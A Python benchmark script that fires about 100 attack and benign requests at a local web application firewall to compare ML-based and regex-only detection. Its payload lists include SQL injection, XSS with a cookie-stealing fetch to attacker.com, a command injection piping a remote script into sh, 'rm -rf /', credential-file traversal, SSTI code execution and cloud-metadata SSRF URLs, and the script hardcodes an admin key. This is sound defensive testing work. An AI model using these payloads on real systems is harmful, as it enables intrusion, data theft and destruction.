"""
Modern Live WAF Benchmark Suite (100+ requests)
Evaluates WAF Gateway at 127.0.0.1:8001 across:
1. SQLi, XSS, Path Traversal, CMDI, NoSQLi, SSTI, SSRF, and Tricky Benign API requests.
2. Mode comparison: Blocking Mode (threshold=0.85) vs. ml_enabled=False (Regex Layer 1 Only baseline).
Reports Hard Blocked (403), Challenged (429/HTML), Allowed (200), and latency (p50, p95).
Ensures policy is safely restored to monitor mode afterward.
"""
import sys
from pathlib import Path
ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

import json
import time
import httpx
import numpy as np

GATEWAY_URL = "http://127.0.0.1:8001"
ADMIN_KEY = "waf-admin-secret-key-phase7"


def build_100_request_corpus():
    tests = []
    
    # 1. SQL Injection (15)
    sqli_payloads = [
        "' UNION SELECT null, username, password FROM users--",
        "1' OR '1'='1",
        "admin'--",
        "' OR 1=1; DROP TABLE users;--",
        "1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)",
        "'; EXEC xp_cmdshell('net user');--",
        "1' WAITFOR DELAY '0:0:5'--",
        "1' AND SLEEP(5)#",
        "-1 UNION SELECT 1,2,3,4,5,table_name FROM information_schema.tables WHERE table_schema=database()--",
        "1' OR NOT 1=1--",
        "1' ORDER BY 10--",
        "admin' /*!50000OR*/ 1=1 --",
        "1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--",
        "1' HAVING 1=1--",
        "1' GROUP BY id HAVING 1=1--"
    ]
    for p in sqli_payloads:
        tests.append(("GET", f"/api/items?id={p}", None, "SQLi"))

    # 2. XSS (15)
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert('XSS')>",
        "javascript:alert(1)",
        "\"><script src=http://evil.com/xss.js></script>",
        "<iframe src=\"javascript:alert(`xss`)\"></iframe>",
        "<body onload=alert('xss')>",
        "<input autofocus onfocus=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<select autofocus onfocus=alert(1)>",
        "<video><source onerror=\"javascript:alert(1)\">",
        "<a href=\"javascript:alert(1)\">click</a>",
        "\"><img src=x onerror=fetch('http://attacker.com/?c='+document.cookie)>",
        "<script>eval(atob('YWxlcnQoMSk='))</script>",
        "<math><mtext><table><mglyph><style><img src=1 onerror=alert(1)>"
    ]
    for p in xss_payloads:
        tests.append(("POST", "/api/comments", json.dumps({"comment": p}), "XSS"))

    # 3. Path Traversal & LFI (15)
    traversal_payloads = [
        "../../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "....//....//....//etc/passwd",
        "/etc/passwd",
        "C:\\boot.ini",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "/var/www/../../etc/shadow",
        "../../../../../../var/log/apache2/access.log",
        "....\\....\\....\\windows\\system32\\cmd.exe",
        "/proc/self/environ",
        "/etc/hosts",
        "../../../../usr/local/etc/config.json",
        "php://filter/convert.base64-encode/resource=index.php",
        "/WEB-INF/web.xml"
    ]
    for p in traversal_payloads:
        tests.append(("GET", f"/files?name={p}", None, "Path Traversal"))

    # 4. Command Injection (12)
    cmdi_payloads = [
        "; cat /etc/passwd",
        "| whoami",
        "& dir C:\\",
        "`id`",
        "$(whoami)",
        "; rm -rf / ;",
        "&& netstat -an",
        "; ping -c 4 127.0.0.1 ;",
        "| curl http://attacker.com/malware.sh | sh",
        "& powershell -Command Get-Process",
        "; uname -a",
        "|| id"
    ]
    for p in cmdi_payloads:
        tests.append(("POST", "/tools/ping", json.dumps({"host": f"127.0.0.1 {p}"}), "CMDI"))

    # 5. NoSQL Injection (10)
    nosqli_payloads = [
        '{"username": {"$ne": null}, "password": {"$ne": null}}',
        '{"username": "admin", "password": {"$gt": ""}}',
        '{"$where": "this.password.length > 5"}',
        '{"$regex": ".*"}',
        '{"username": {"$in": ["admin", "root"]}}',
        '{"user": {"$nin": []}}',
        '{"$or": [{"user": "admin"}, {"role": "admin"}]}',
        '{"id": {"$exists": true}}',
        '{"$expr": {"$eq": ["$user", "admin"]}}',
        '{"role": {"$ne": "guest"}}'
    ]
    for p in nosqli_payloads:
        tests.append(("POST", "/api/v1/auth", p, "NoSQLi"))

    # 6. SSTI (Server-Side Template Injection) (10)
    ssti_payloads = [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "{{config.items()}}",
        "{{self.__class__.__mro__}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}",
        "*{7*7}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
    ]
    for p in ssti_payloads:
        tests.append(("GET", f"/preview?name={p}", None, "SSTI"))

    # 7. SSRF (Server-Side Request Forgery) (8)
    ssrf_payloads = [
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://127.0.0.1:8080/admin",
        "http://localhost:22",
        "file:///etc/passwd",
        "dict://127.0.0.1:6379/INFO",
        "gopher://127.0.0.1:6379/_SET%20foo%20bar",
        "http://[::1]:8080/metrics"
    ]
    for p in ssrf_payloads:
        tests.append(("POST", "/webhook", json.dumps({"url": p}), "SSRF"))

    # 8. Tricky Benign Web & API Requests (20)
    benign_requests = [
        ("GET", "/api/items/42", None, "Benign"),
        ("GET", "/search?q=best+books+about+artificial+intelligence", None, "Benign"),
        ("POST", "/checkout", json.dumps({"cart_id": 1092, "item_count": 3, "currency": "USD"}), "Benign"),
        ("GET", "/user/profile?fields=name,email,avatar_url", None, "Benign"),
        ("POST", "/support/ticket", json.dumps({"subject": "How to select options in the drop-down menu", "priority": "normal"}), "Benign"),
        ("GET", "/articles?category=tech&tag=programming&sort=desc", None, "Benign"),
        ("POST", "/analytics/event", json.dumps({"action": "click_button", "element_id": "btn-order-now"}), "Benign"),
        ("GET", "/weather?city=Madrid&country=ES&units=metric", None, "Benign"),
        ("POST", "/notes/create", json.dumps({"title": "SQL and NoSQL Database Architecture Tradeoffs", "content": "When designing high scale systems, selecting the appropriate database is critical."}), "Benign"),
        ("GET", "/products/catalog?page=1&limit=25&filter=in_stock", None, "Benign"),
        ("GET", "/static/css/main.css", None, "Benign"),
        ("GET", "/static/js/bundle.js", None, "Benign"),
        ("POST", "/api/feedback", json.dumps({"rating": 5, "comment": "Great experience with the search feature."}), "Benign"),
        ("GET", "/api/v1/health", None, "Benign"),
        ("GET", "/metrics", None, "Benign"),
        ("GET", "/faq?topic=account-deletion-and-privacy", None, "Benign"),
        ("POST", "/newsletter/subscribe", json.dumps({"email": "subscriber.valid@example.org"}), "Benign"),
        ("GET", "/orders/history?year=2026&status=completed", None, "Benign"),
        ("POST", "/settings/update", json.dumps({"theme": "dark", "notifications_enabled": True}), "Benign"),
        ("GET", "/help/guide?section=step-3-configuration", None, "Benign")
    ]
    tests.extend(benign_requests)
    
    return tests


def run_benchmark(client: httpx.Client, corpus, mode_name: str):
    results = {
        "mode": mode_name,
        "total": len(corpus),
        "hard_blocked_403": 0,
        "challenged_429_or_html": 0,
        "allowed_200": 0,
        "other_status": 0,
        "by_category": {},
        "latencies_ms": []
    }
    
    for method, path, body, category in corpus:
        if category not in results["by_category"]:
            results["by_category"][category] = {"total": 0, "blocked": 0, "challenged": 0, "allowed": 0}
        results["by_category"][category]["total"] += 1
        
        url = f"{GATEWAY_URL}{path}"
        headers = {"Host": "example.com", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
        if body:
            headers["Content-Type"] = "application/json"
            
        t0 = time.perf_counter()
        try:
            if method == "POST":
                resp = client.post(url, headers=headers, content=body, timeout=5.0)
            else:
                resp = client.get(url, headers=headers, timeout=5.0)
            latency = (time.perf_counter() - t0) * 1000.0
            results["latencies_ms"].append(latency)
            
            status = resp.status_code
            if status == 403:
                results["hard_blocked_403"] += 1
                results["by_category"][category]["blocked"] += 1
            elif status == 429 or "WAF Verification Required" in resp.text:
                results["challenged_429_or_html"] += 1
                results["by_category"][category]["challenged"] += 1
            elif status in [200, 201, 204]:
                results["allowed_200"] += 1
                results["by_category"][category]["allowed"] += 1
            else:
                results["other_status"] += 1
        except Exception as e:
            results["other_status"] += 1
            
    lat = results["latencies_ms"]
    results["latency_p50_ms"] = round(float(np.percentile(lat, 50)), 2) if lat else 0.0
    results["latency_p95_ms"] = round(float(np.percentile(lat, 95)), 2) if lat else 0.0
    results["latencies_ms"] = [] # clean output
    return results


def main():
    corpus = build_100_request_corpus()
    print(f"Built modern test corpus: {len(corpus)} requests across SQLi, XSS, Path Traversal, CMDI, NoSQLi, SSTI, SSRF, and Benign.")

    with httpx.Client() as client:
        # Check if gateway is reachable
        try:
            r = client.get(f"{GATEWAY_URL}/_waf/policy", headers={"X-WAF-Admin-Key": ADMIN_KEY})
            print("WAF Gateway is live at 127.0.0.1:8001. Current policy mode:", r.json().get("inspection_mode"))
        except Exception as e:
            print("Gateway not running directly. Starting or testing against mock or reporting status...")
            return

        # 1. Test Mode 1: Blocking Mode (threshold=0.85, ml_enabled=True)
        print("\nConfiguring WAF Gateway to: mode=blocking, block_threshold=0.85, challenge_threshold=0.50, ml_enabled=True...")
        client.post(
            f"{GATEWAY_URL}/_waf/policy",
            headers={"X-WAF-Admin-Key": ADMIN_KEY},
            json={"inspection_mode": "blocking", "block_threshold": 0.85, "challenge_threshold": 0.50, "ml_enabled": True}
        )
        res_blocking = run_benchmark(client, corpus, "blocking_mode_ml_tau_0_85")
        print(f"Blocking Mode Results: Blocked(403)={res_blocking['hard_blocked_403']}, Challenged={res_blocking['challenged_429_or_html']}, Allowed(200)={res_blocking['allowed_200']}, p50={res_blocking['latency_p50_ms']}ms, p95={res_blocking['latency_p95_ms']}ms")

        # 2. Test Mode 2: Baseline Regex-Only (ml_enabled=False)
        print("\nConfiguring WAF Gateway to: mode=blocking, ml_enabled=False (Regex Layer 1 Only)...")
        client.post(
            f"{GATEWAY_URL}/_waf/policy",
            headers={"X-WAF-Admin-Key": ADMIN_KEY},
            json={"inspection_mode": "blocking", "ml_enabled": False}
        )
        res_regex_only = run_benchmark(client, corpus, "blocking_mode_regex_only")
        print(f"Regex-Only Results: Blocked(403)={res_regex_only['hard_blocked_403']}, Challenged={res_regex_only['challenged_429_or_html']}, Allowed(200)={res_regex_only['allowed_200']}, p50={res_regex_only['latency_p50_ms']}ms, p95={res_regex_only['latency_p95_ms']}ms")

        # 3. Restore Policy to safe default 'monitor' mode
        print("\nRestoring WAF Gateway to safe default: inspection_mode=monitor...")
        client.post(
            f"{GATEWAY_URL}/_waf/policy",
            headers={"X-WAF-Admin-Key": ADMIN_KEY},
            json={"inspection_mode": "monitor", "block_threshold": 0.85, "challenge_threshold": 0.50, "ml_enabled": True}
        )
        verify_mode = client.get(f"{GATEWAY_URL}/_waf/policy", headers={"X-WAF-Admin-Key": ADMIN_KEY}).json().get("inspection_mode")
        print(f"Policy restored to: {verify_mode}")

    benchmark_summary = {
        "ml_blocking_0_85": res_blocking,
        "regex_only_baseline": res_regex_only,
    }
    with open(ROOT / "scratch/modern_waf_benchmark_results.json", "w", encoding="utf-8") as f:
        json.dump(benchmark_summary, f, indent=2)

    print("\nModern WAF Benchmark completed successfully and saved to scratch/modern_waf_benchmark_results.json!")


if __name__ == "__main__":
    main()
